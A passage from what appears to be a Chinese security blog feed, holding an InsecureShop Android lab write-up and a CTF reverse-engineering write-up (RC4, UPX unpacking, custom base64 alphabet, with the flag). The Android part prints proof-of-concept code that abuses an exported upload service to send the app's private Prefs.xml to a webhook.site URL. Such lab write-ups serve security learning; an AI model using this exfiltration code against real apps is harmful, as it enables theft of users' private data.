!= null) &#123;            Parcelable parcelableExtra = getIntent().getParcelableExtra(&quot;android.intent.extra.STREAM&quot;);            if (parcelableExtra == null) &#123;                throw new TypeCastException(&quot;null cannot be cast to non-null type android.net.Uri&quot;);            &#125;            Uri uri = Uri.fromFile(new File(((Uri) parcelableExtra).toString()));            Intrinsics.checkExpressionValueIsNotNull(uri, &quot;Uri.fromFile(File(uri.toString()))&quot;);            makeTempCopy(uri, getFilename(uri));        &#125;    &#125;    private final Uri makeTempCopy(Uri fileUri, String original_filename) &#123;        try &#123;            StringBuilder sb = new StringBuilder();            File externalStorageDirectory = Environment.getExternalStorageDirectory();            Intrinsics.checkExpressionValueIsNotNull(externalStorageDirectory, &quot;Environment.getExternalStorageDirectory()&quot;);            sb.append(externalStorageDirectory.getAbsolutePath());            sb.append(File.separator);            sb.append(&quot;insecureshop&quot;);            String path = sb.toString();            File directory = new File(path);            if (!directory.exists()) &#123;                directory.mkdirs();            &#125;            File fileTemp = new File(path, original_filename);            fileTemp.createNewFile();            Uri fromFile = Uri.fromFile(fileTemp);            InputStream openInputStream = getContentResolver().openInputStream(fileUri);            OutputStream openOutputStream = getContentResolver().openOutputStream(fromFile);            byte[] bArr = new byte[8192];            while (true) &#123;                Integer len = openInputStream != null ? Integer.valueOf(openInputStream.read(bArr)) : null;                if (len != null &amp;&amp; len.intValue() == -1) &#123;                &#125;                if (len != null) &#123;                    int it = len.intValue();                    if (openOutputStream != null) &#123;                        openOutputStream.write(bArr, 0, it);                    &#125;                &#125;            &#125;        &#125; catch (Exception e) &#123;            return null;        &#125;    &#125;    public final String getFilename(Uri uri) &#123;        Intrinsics.checkParameterIsNotNull(uri, &quot;uri&quot;);        String fileName = (String) null;        Context context = getApplicationContext();        String scheme = uri.getScheme();        if (Intrinsics.areEqual(scheme, &quot;file&quot;)) &#123;            return uri.getLastPathSegment();        &#125;        if (Intrinsics.areEqual(scheme, &quot;content&quot;)) &#123;            String[] proj = &#123;&quot;_display_name&quot;&#125;;            Intrinsics.checkExpressionValueIsNotNull(context, &quot;context&quot;);            Cursor cursor = context.getContentResolver().query(uri, proj, null, null, null);            if (cursor != null &amp;&amp; cursor.getCount() != 0) &#123;                int columnIndex = cursor.getColumnIndexOrThrow(&quot;_display_name&quot;);                cursor.moveToFirst();                return cursor.getString(columnIndex);            &#125;            return fileName;        &#125;        return fileName;    &#125;&#125;</span></span><br></pre></td></tr></table></figure><p>代码有点长，但我们来逐步解析，从 Intent 开始：</p><ul><li>检查 Intent 是否有额外的数据，并特别查找键为 <code>android.intent.extra.STREAM</code> 的额外数据。</li><li><strong><code>Parcelable parcelableExtra = getIntent().getParcelableExtra(&quot;android.intent.extra.STREAM&quot;)</code></strong>: 从 Intent 中获取键为<br><code>android.intent.extra.STREAM</code> 的 Parcelable 额外数据。这通常用于在组件之间传递复杂的数据。</li><li><strong><code>Uri uri = Uri.fromFile(new File(((Uri) parcelableExtra).toString()))</code></strong>: 将 Parcelable 对象（应该是一个 <code>Uri</code>）转换为<br><code>File</code> 对象，然后从该文件创建一个 <code>Uri</code>。这一行假设 Parcelable 额外数据是一个表示文件路径的 <code>Uri</code>。</li><li>创建文件的临时副本，并使用 <code>makeTempCopy</code> 处理它。</li></ul><p>接下来是 <strong><code>makeTempCopy()</code></strong> 方法：</p><ul><li>创建由 <code>Uri</code> 指定的文件的临时副本。</li><li>它读取原始文件的内容，并将其写入外部存储目录 (<code>/sdcard/insecureshop/</code>) 中的新文件。</li></ul><p>再来看 <strong><code>getFilename()</code></strong> 方法：</p><ul><li>该方法从 <code>Uri</code> 中确定文件名。</li></ul><p>基于以上信息，我们来创建一个示例的利用程序，以下代码将复制 <code>Prefs.xml</code> 文件作为一个例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;<span class="meta">@Overrideprotected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;    <span class="built_in">super</span>.onCreate(savedInstanceState);    setContentView(R.layout.activity_main);    <span class="type">Button</span> <span class="variable">TheftofArbitraryFilesButton</span> <span class="operator">=</span> (Button) findViewById(R.id.TheftofArbitraryFiles);    <span class="comment">// Set a click listener to send the intent    TheftofArbitraryFilesButton.setOnClickListener(new View.OnClickListener() &#123;    @Override    public void onClick(View v) &#123;        Intent StealingFile = new Intent();        // Selecting the ChooserActivity        StealingFile.setClassName(&quot;com.insecureshop&quot;, &quot;com.insecureshop.ChooserActivity&quot;);        // Specfiying the Prefs.xml file        Uri FileName = Uri.parse(&quot;/data/data/com.insecureshop/shared_prefs/Prefs.xml&quot;);        // adding the EXTRA_STREAM as an extra to trigger the exported Intent        StealingFile.putExtra(StealingFile.EXTRA_STREAM, FileName);        // Starting the Intent        startActivity(StealingFile);    &#125;    &#125;);&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>并没有复现成功</p><p><img src="/../imgs/183e7c086b3081bf800fe3e88ab4f232/Pulrgximageimage_6FKLgC2yfC.png" alt="183e7c086b3081bf800fe3e88ab4f232&#x2F;Pulrgximageimage_6FKLgC2yfC.png"></p><h2 id="使用具有已知漏洞的组件"><a href="#使用具有已知漏洞的组件" class="headerlink" title="使用具有已知漏洞的组件"></a><strong>使用具有已知漏洞的组件</strong></h2><p>识别应用程序中使用的易受攻击的组件或库，这些组件或库可能允许您将本地文件泄露到远程域。</p><p>看起来该应用程序包含一个名为 <code>net.gotev.uploadservice</code> 的易受攻击的上传服务库，并且它在 <code>androidManfiest.xml</code>中被导出了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;service android:name=<span class="string">&quot;net.gotev.uploadservice.UploadService&quot;</span> android:enabled=<span class="string">&quot;true&quot;</span> android:exported=<span class="string">&quot;true&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>在HackerOne上有一份公开报告利用了这项服务：</p><p>[ HackerOne &gt; On the newest Androids it also can be exploited via Instant Apps directly from a web-browser (installation of an app is not required).It actually was a mistake, services can be accessed by Instant A <a href="https://hackerone.com/reports/258460]">https://hackerone.com/reports/258460]</a>(<a href="https://hackerone.com/reports/258460">https://hackerone.com/reports/258460</a> ”<br>HackerOne &gt; On the newest Androids it also can be exploited via Instant Apps directly from a web-browser (installation<br>of an app is not required).It actually was a mistake, services can be accessed by Instant<br>A <a href="https://hackerone.com/reports/258460%E2%80%9D">https://hackerone.com/reports/258460”</a>)</p><p>报告中提到，由于该服务被导出，它允许安装在同一设备上的任何应用程序使用它来从易受攻击的应用程序目录中窃取任何文件，在我们的情况下是<br><code>/data/data/com.insecureshop</code>。我将创建一个新的漏洞利用应用程序，并将易受攻击的库代码添加到我的漏洞利用应用程序中。以下是在Insecureapp中使用的易受攻击版本<br><code>android-upload-service-3.2.3</code>的链接：</p><p><a href="https://github.com/gotev/android-upload-service/releases?page=4">https://github.com/gotev/android-upload-service/releases?page=4</a></p><p>首先，你需要通过编辑 settings.gradle 文件并将依赖项添加到 build.gradle 文件中，将这个库导入到你的代码中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dependencyResolutionManagement &#123;repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)repositories &#123;    google()    mavenCentral()    maven &#123; url <span class="string">&#x27;https://jitpack.io&#x27;</span> &#125;    jcenter() <span class="comment">// Warning: this repository is going to shut down soon&#125;&#125;rootProject.name = &quot;gotevUploadServiceExploit&quot;include &#x27;:app&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dependencies</span><br><span class="line">&#123;    implementation <span class="string">&#x27;com.github.gotev.android-upload-service:uploadservice:3.2.3&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><p>最后，点击同步Gradle，然后修改Hackerone研究人员提供的POC，尝试窃取<code>Prefs.xml</code>文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.insecureshopapp.gotevuploadserviceexploit;<span class="keyword">import</span> android.app.Activity;<span class="keyword">import</span> android.content.Intent;<span class="keyword">import</span> android.os.Bundle;<span class="keyword">import</span> java.io.FileNotFoundException;<span class="keyword">import</span> net.gotev.uploadservice.HttpUploadTaskParameters;<span class="keyword">import</span> net.gotev.uploadservice.UploadFile;<span class="keyword">import</span> net.gotev.uploadservice.UploadTaskParameters;<span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;<span class="meta">@Overrideprotected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;    <span class="built_in">super</span>.onCreate(savedInstanceState);    setContentView(R.layout.activity_main);    <span class="type">UploadTaskParameters</span> <span class="variable">params</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UploadTaskParameters</span>();    <span class="comment">// Random Id parameter    params.setId(&quot;18888998&quot;);    // Any Server URL to receive the local file    params.setServerUrl(&quot;http://webhook.site/4f08c75a-a478-4f6f-93bb-2ee8eba6fa4b&quot;);    try &#123;        params.addFile(new UploadFile(&quot;/data/data/com.insecureshop/shared_prefs/Prefs.xml&quot;));        Intent intent = new Intent(&quot;net.gotev.uploadservice.action.upload&quot;);        intent.setClassName(&quot;com.insecureshop&quot;, &quot;net.gotev.uploadservice.UploadService&quot;);        intent.putExtra(&quot;taskClass&quot;, &quot;net.gotev.uploadservice.MultipartUploadTask&quot;);        intent.putExtra(&quot;multipartUtf8Charset&quot;, true);        intent.putExtra(&quot;httpTaskParameters&quot;, new HttpUploadTaskParameters());        intent.putExtra(&quot;taskParameters&quot;, params);        startService(intent);    &#125; catch (FileNotFoundException e) &#123;        throw new IllegalStateException(e);    &#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 移动安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第七届浙江省大学生网络与信息安全竞赛决赛 Reverse</title>
      <link href="/2024/11/18/%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B%20Reverse/"/>
      <url>/2024/11/18/%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B%20Reverse/</url>
      
        <content type="html"><![CDATA[<h2 id="Reverse1"><a href="#Reverse1" class="headerlink" title="Reverse1"></a>Reverse1</h2><p>反编译后得到</p><p><img src="/../imgs/%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B%20Reverse%20142e7c086b30803b910bfe26aa5c6097/image.png" alt="image.png"></p><p>首先看初始化函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">int</span> init(EVP_PKEY_CTX *ctx)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  EVP_PKEY_CTX EVar1;</span><br><span class="line">  long lVar2;</span><br><span class="line">  ulong in_RDX;</span><br><span class="line">  long in_RSI;</span><br><span class="line">  uint *puVar3;</span><br><span class="line">  long in_FS_OFFSET;</span><br><span class="line">  <span class="built_in">int</span> local_424;</span><br><span class="line">  <span class="built_in">int</span> local_420;</span><br><span class="line">  <span class="built_in">int</span> local_41c;</span><br><span class="line">  uint local_418 [<span class="number">258</span>];</span><br><span class="line">  long local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = *(long *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  puVar3 = local_418;</span><br><span class="line">  <span class="keyword">for</span> (lVar2 = <span class="number">0x80</span>; lVar2 != <span class="number">0</span>; lVar2 = lVar2 + -<span class="number">1</span>) &#123;</span><br><span class="line">    puVar3[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    puVar3[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    puVar3 = puVar3 + <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (local_424 = <span class="number">0</span>; local_424 &lt; <span class="number">256</span>; local_424 = local_424 + <span class="number">1</span>) &#123;</span><br><span class="line">    ctx[local_424] = SUB41(local_424,<span class="number">0</span>);</span><br><span class="line">    local_418[local_424] = (uint)*(byte *)(in_RSI + (ulong)(long)local_424 % in_RDX);</span><br><span class="line">  &#125;</span><br><span class="line">  local_420 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (local_41c = <span class="number">0</span>; local_41c &lt; <span class="number">256</span>; local_41c = local_41c + <span class="number">1</span>) &#123;</span><br><span class="line">    local_420 = (<span class="built_in">int</span>)((uint)(byte)ctx[local_41c] + local_420 + local_418[local_41c]) % <span class="number">0x100</span>;</span><br><span class="line">    EVar1 = ctx[local_41c];</span><br><span class="line">    ctx[local_41c] = ctx[local_420];</span><br><span class="line">    ctx[local_420] = EVar1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (local_10 != *(long *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">                    /* WARNING: Subroutine does <span class="keyword">not</span> <span class="keyword">return</span> */</span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里是实现了一个RC4流密码的初始化</p><h2 id="Reverse2"><a href="#Reverse2" class="headerlink" title="Reverse2"></a>Reverse2</h2><p><a href="../imgs/%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B%20Reverse%20142e7c086b30803b910bfe26aa5c6097/Reverse2.exe.zip">Reverse2.exe.zip</a></p><p>使用反编译工具打开附件发现，反编译出没有什么有用的函数，通过分析发现程序加壳了</p><p>![image.png](..&#x2F;imgs&#x2F;第七届浙江省大学生网络与信息安全竞赛决赛%20Reverse%20142e7c086b30803b910bfe26aa5c6097&#x2F;image 1.png)</p><p>把<code>ABC</code> 修改为<code>UPX</code> 进行脱壳</p><p>![image.png](..&#x2F;imgs&#x2F;第七届浙江省大学生网络与信息安全竞赛决赛%20Reverse%20142e7c086b30803b910bfe26aa5c6097&#x2F;image 2.png)</p><p>脱壳后可以正常进行反编译，在代码中发现，base64的字母表</p><p>![image.png](..&#x2F;imgs&#x2F;第七届浙江省大学生网络与信息安全竞赛决赛%20Reverse%20142e7c086b30803b910bfe26aa5c6097&#x2F;image 3.png)</p><p>编码后的数据</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">  local_138[<span class="number">0x30</span>] = <span class="number">0x6d</span>;</span><br><span class="line">local_138[<span class="number">0x31</span>] = <span class="number">0x6f</span>;</span><br><span class="line">local_138[<span class="number">0x32</span>] = <span class="number">0x4c</span>;</span><br><span class="line">local_138[<span class="number">0x33</span>] = <span class="number">0x3d</span>;</span><br><span class="line">local_138[<span class="number">0</span>] = <span class="number">0x75</span>;</span><br><span class="line">local_138[<span class="number">1</span>] = <span class="number">0x37</span>;</span><br><span class="line">local_138[<span class="number">2</span>] = <span class="number">0x36</span>;</span><br><span class="line">local_138[<span class="number">3</span>] = <span class="number">0x73</span>;</span><br><span class="line">local_138[<span class="number">4</span>] = <span class="number">0x76</span>;</span><br><span class="line">local_138[<span class="number">5</span>] = <span class="number">0x4b</span>;</span><br><span class="line">local_138[<span class="number">6</span>] = <span class="number">0x75</span>;</span><br><span class="line">local_138[<span class="number">7</span>] = <span class="number">0x35</span>;</span><br><span class="line">local_138[<span class="number">8</span>] = <span class="number">0x68</span>;</span><br><span class="line">local_138[<span class="number">9</span>] = <span class="number">0x4a</span>;</span><br><span class="line">local_138[<span class="number">10</span>] = <span class="number">0x76</span>;</span><br><span class="line">local_138[<span class="number">0xb</span>] = <span class="number">0x4c</span>;</span><br><span class="line">local_138[<span class="number">0xc</span>] = <span class="number">0x7a</span>;</span><br><span class="line">local_138[<span class="number">0xd</span>] = <span class="number">0x70</span>;</span><br><span class="line">local_138[<span class="number">0xe</span>] = <span class="number">0x76</span>;</span><br><span class="line">local_138[<span class="number">0xf</span>] = <span class="number">0x48</span>;</span><br><span class="line">local_138[<span class="number">0x34</span>] = <span class="number">0</span>;</span><br><span class="line">local_138[<span class="number">0x10</span>] = <span class="number">0x6e</span>;</span><br><span class="line">local_138[<span class="number">0x11</span>] = <span class="number">0x4a</span>;</span><br><span class="line">local_138[<span class="number">0x12</span>] = <span class="number">0x76</span>;</span><br><span class="line">local_138[<span class="number">0x13</span>] = <span class="number">0x47</span>;</span><br><span class="line">local_138[<span class="number">0x14</span>] = <span class="number">0x78</span>;</span><br><span class="line">local_138[<span class="number">0x15</span>] = <span class="number">0x35</span>;</span><br><span class="line">local_138[<span class="number">0x16</span>] = <span class="number">0x6e</span>;</span><br><span class="line">local_138[<span class="number">0x17</span>] = <span class="number">0x50</span>;</span><br><span class="line">local_138[<span class="number">0x18</span>] = <span class="number">0x7a</span>;</span><br><span class="line">local_138[<span class="number">0x19</span>] = <span class="number">0x35</span>;</span><br><span class="line">local_138[<span class="number">0x1a</span>] = <span class="number">0x33</span>;</span><br><span class="line">local_138[<span class="number">0x1b</span>] = <span class="number">0x4e</span>;</span><br><span class="line">local_138[<span class="number">0x1c</span>] = <span class="number">0x7a</span>;</span><br><span class="line">local_138[<span class="number">0x1d</span>] = <span class="number">0x38</span>;</span><br><span class="line">local_138[<span class="number">0x1e</span>] = <span class="number">0x75</span>;</span><br><span class="line">local_138[<span class="number">0x1f</span>] = <span class="number">0x61</span>;</span><br><span class="line">local_138[<span class="number">0x20</span>] = <span class="number">0x78</span>;</span><br><span class="line">local_138[<span class="number">0x21</span>] = <span class="number">0x73</span>;</span><br><span class="line">local_138[<span class="number">0x22</span>] = <span class="number">0x66</span>;</span><br><span class="line">local_138[<span class="number">0x23</span>] = <span class="number">0x47</span>;</span><br><span class="line">local_138[<span class="number">0x24</span>] = <span class="number">0x78</span>;</span><br><span class="line">local_138[<span class="number">0x25</span>] = <span class="number">0x73</span>;</span><br><span class="line">local_138[<span class="number">0x26</span>] = <span class="number">0x65</span>;</span><br><span class="line">local_138[<span class="number">0x27</span>] = <span class="number">0x61</span>;</span><br><span class="line">local_138[<span class="number">0x28</span>] = <span class="number">0x6e</span>;</span><br><span class="line">local_138[<span class="number">0x29</span>] = <span class="number">0x4a</span>;</span><br><span class="line">local_138[<span class="number">0x2a</span>] = <span class="number">0x6e</span>;</span><br><span class="line">local_138[<span class="number">0x2b</span>] = <span class="number">0x48</span>;</span><br><span class="line">local_138[<span class="number">0x2c</span>] = <span class="number">0x79</span>;</span><br><span class="line">local_138[<span class="number">0x2d</span>] = <span class="number">0x38</span>;</span><br><span class="line">local_138[<span class="number">0x2e</span>] = <span class="number">0x33</span>;</span><br><span class="line">local_138[<span class="number">0x2f</span>] = <span class="number">0x49</span>;</span><br></pre></td></tr></table></figure><p>解码代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">local_138 = [<span class="number">0</span>] * <span class="number">0x35</span></span><br><span class="line"><span class="comment">## 初始化 local_138</span></span><br><span class="line">local_138[<span class="number">0x30</span>] = <span class="number">0x6d</span></span><br><span class="line">local_138[<span class="number">0x31</span>] = <span class="number">0x6f</span></span><br><span class="line">local_138[<span class="number">0x32</span>] = <span class="number">0x4c</span></span><br><span class="line">local_138[<span class="number">0x33</span>] = <span class="number">0x3d</span></span><br><span class="line">local_138[<span class="number">0</span>] = <span class="number">0x75</span></span><br><span class="line">local_138[<span class="number">1</span>] = <span class="number">0x37</span></span><br><span class="line">local_138[<span class="number">2</span>] = <span class="number">0x36</span></span><br><span class="line">local_138[<span class="number">3</span>] = <span class="number">0x73</span></span><br><span class="line">local_138[<span class="number">4</span>] = <span class="number">0x76</span></span><br><span class="line">local_138[<span class="number">5</span>] = <span class="number">0x4b</span></span><br><span class="line">local_138[<span class="number">6</span>] = <span class="number">0x75</span></span><br><span class="line">local_138[<span class="number">7</span>] = <span class="number">0x35</span></span><br><span class="line">local_138[<span class="number">8</span>] = <span class="number">0x68</span></span><br><span class="line">local_138[<span class="number">9</span>] = <span class="number">0x4a</span></span><br><span class="line">local_138[<span class="number">10</span>] = <span class="number">0x76</span></span><br><span class="line">local_138[<span class="number">0xb</span>] = <span class="number">0x4c</span></span><br><span class="line">local_138[<span class="number">0xc</span>] = <span class="number">0x7a</span></span><br><span class="line">local_138[<span class="number">0xd</span>] = <span class="number">0x70</span></span><br><span class="line">local_138[<span class="number">0xe</span>] = <span class="number">0x76</span></span><br><span class="line">local_138[<span class="number">0xf</span>] = <span class="number">0x48</span></span><br><span class="line">local_138[<span class="number">0x34</span>] = <span class="number">0</span></span><br><span class="line">local_138[<span class="number">0x10</span>] = <span class="number">0x6e</span></span><br><span class="line">local_138[<span class="number">0x11</span>] = <span class="number">0x4a</span></span><br><span class="line">local_138[<span class="number">0x12</span>] = <span class="number">0x76</span></span><br><span class="line">local_138[<span class="number">0x13</span>] = <span class="number">0x47</span></span><br><span class="line">local_138[<span class="number">0x14</span>] = <span class="number">0x78</span></span><br><span class="line">local_138[<span class="number">0x15</span>] = <span class="number">0x35</span></span><br><span class="line">local_138[<span class="number">0x16</span>] = <span class="number">0x6e</span></span><br><span class="line">local_138[<span class="number">0x17</span>] = <span class="number">0x50</span></span><br><span class="line">local_138[<span class="number">0x18</span>] = <span class="number">0x7a</span></span><br><span class="line">local_138[<span class="number">0x19</span>] = <span class="number">0x35</span></span><br><span class="line">local_138[<span class="number">0x1a</span>] = <span class="number">0x33</span></span><br><span class="line">local_138[<span class="number">0x1b</span>] = <span class="number">0x4e</span></span><br><span class="line">local_138[<span class="number">0x1c</span>] = <span class="number">0x7a</span></span><br><span class="line">local_138[<span class="number">0x1d</span>] = <span class="number">0x38</span></span><br><span class="line">local_138[<span class="number">0x1e</span>] = <span class="number">0x75</span></span><br><span class="line">local_138[<span class="number">0x1f</span>] = <span class="number">0x61</span></span><br><span class="line">local_138[<span class="number">0x20</span>] = <span class="number">0x78</span></span><br><span class="line">local_138[<span class="number">0x21</span>] = <span class="number">0x73</span></span><br><span class="line">local_138[<span class="number">0x22</span>] = <span class="number">0x66</span></span><br><span class="line">local_138[<span class="number">0x23</span>] = <span class="number">0x47</span></span><br><span class="line">local_138[<span class="number">0x24</span>] = <span class="number">0x78</span></span><br><span class="line">local_138[<span class="number">0x25</span>] = <span class="number">0x73</span></span><br><span class="line">local_138[<span class="number">0x26</span>] = <span class="number">0x65</span></span><br><span class="line">local_138[<span class="number">0x27</span>] = <span class="number">0x61</span></span><br><span class="line">local_138[<span class="number">0x28</span>] = <span class="number">0x6e</span></span><br><span class="line">local_138[<span class="number">0x29</span>] = <span class="number">0x4a</span></span><br><span class="line">local_138[<span class="number">0x2a</span>] = <span class="number">0x6e</span></span><br><span class="line">local_138[<span class="number">0x2b</span>] = <span class="number">0x48</span></span><br><span class="line">local_138[<span class="number">0x2c</span>] = <span class="number">0x79</span></span><br><span class="line">local_138[<span class="number">0x2d</span>] = <span class="number">0x38</span></span><br><span class="line">local_138[<span class="number">0x2e</span>] = <span class="number">0x33</span></span><br><span class="line">local_138[<span class="number">0x2f</span>] = <span class="number">0x49</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 将 local_138 转换为字符串</span></span><br><span class="line">encoded_str = <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> local_138])</span><br><span class="line"><span class="built_in">print</span>(encoded_str)</span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span> = encoded_str  <span class="comment">## 欲解密的字符串</span></span><br><span class="line">outtab = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>  <span class="comment">## 原生字母表</span></span><br><span class="line">intab = <span class="string">&quot;/+9876543210zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA&quot;</span>  <span class="comment">## 换表之后的字母表</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(<span class="built_in">str</span>.translate(<span class="built_in">str</span>.maketrans(intab, outtab))))</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">u76svKu5hJvLzpvHnJvGx5nPz53Nz8uaxsfGxseanJnHy83ImoL=</span><br><span class="line"><span class="string">b&#x27;DASCTF&#123;d41d8cd98f00b204e98998ecf8427e&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
